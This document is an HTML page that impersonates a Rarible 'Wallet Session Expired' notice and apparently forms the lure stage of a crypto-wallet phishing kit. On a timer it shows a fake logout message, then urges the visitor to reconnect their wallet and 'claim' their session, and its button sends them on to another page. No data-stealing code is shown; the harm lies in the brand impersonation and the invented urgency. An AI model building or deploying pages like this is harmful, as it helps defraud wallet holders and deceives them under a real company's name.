<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Session Expired</title>
  <link rel="stylesheet" href="styles.css" />
  <style>
    body, html {
      height: 100%;
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      color: #fff;
    }

    .bg-image {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('expired-bg.jpg') no-repeat center center/cover;
      filter: blur(1.01px);
      z-index: -1;
    }

    .message, .session-container {
      max-width: 480px;
      margin: 100px auto;
      padding: 30px;
      background: rgba(18, 18, 18, 0.85);
      border-radius: 18px;
      text-align: center;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.6);
      display: none;
      animation: fadeIn 0.6s ease-in-out forwards;
    }

    .message {
      font-size: 2em;
      font-weight: bold;
      color: #feda00;
    }

    .session-container h2 {
      font-size: 2em;
      margin-bottom: 16px;
      color: #feda00;
    }

    .session-container p {
      font-size: 1.1em;
      color: #ccc;
      margin-bottom: 24px;
    }

    .remember-box {
      margin: 20px 0;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .remember-box input[type="checkbox"] {
      transform: scale(1.2);
    }

    .remember-box label {
      font-size: 1em;
      color: #bbb;
    }

    .resume-btn {
      background: white;
      color: #000;
      border: none;
      font-size: 1.2em;
      padding: 14px 28px;
      cursor: pointer;
      border-radius: 12px;
      transition: background 0.3s ease;
    }

    .resume-btn:hover {
      background: #2877cc;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @media (max-width: 600px) {
      .session-container, .message {
        margin: 50px 20px;
        padding: 20px;
      }

      .message {
        font-size: 1.5em;
      }
    }
    
    .bg-video {
  position: fixed;
  top: 0;
  left: 0;
  min-width: 100%;
  min-height: 100%;
  object-fit: cover;
  z-index: -1;
  filter: blur(6px) brightness(1.3); /* Optional: adjust for visibility */
}

  </style>
</head>
<body>
  <video autoplay muted loop playsinline class="bg-video">
  <source src="expired-bg.mp4" type="video/mp4" />
  Your browser does not support the video tag.
</video>


  <div id="logout-msg" class="message">Wallet Logout Successful</div>

  <div class="session-container" id="session-box">
    <span class="brand"><img src="RB.png" alt="WalletConnect" class="wallet-logo" style="width: auto; height: 60px; margin: 0px; padding: 0p;"/>Rarible</span>
    <h2>Wallet Session Expired</h2>
    <p>Wallet Account Session has Expired, Access to Collection<em>s</em> Limited.<br>
       <span style=" color: #feda00; opacity: -50px;">Youâ€™ve been logged out automatically.</span></p>
    <p>Re<span style=" color: #feda00;">-</span>Connect wallet account and resume your previous activity and Claim your session for 30 more days.</p>

    <div class="remember-box">
      <input type="checkbox" id="remember" />
      <label for="remember">Remember password for 30 days</label>
    </div>

    <button class="resume-btn" onclick="redirectToLogin()">Login to Continue Activity</button>
  </div>

  <script>
    // Step 1: Show "Logout Successful" after 3s
    setTimeout(() => {
      const logoutMsg = document.getElementById('logout-msg');
      logoutMsg.style.display = 'block';

      // Step 2: After 2 more seconds, show session message
      setTimeout(() => {
        logoutMsg.style.display = 'none';
        document.getElementById('session-box').style.display = 'block';
      }, 2000);
    }, 10000);

    // Redirect to index.html if "Remember me" is checked
    function redirectToLogin() {
      const remember = document.getElementById('remember').checked;
      if (remember) {
        localStorage.setItem('rememberMe30Days', 'true');
      }
      window.location.href = 'index.html';
    }
  </script>
</body>
</html>
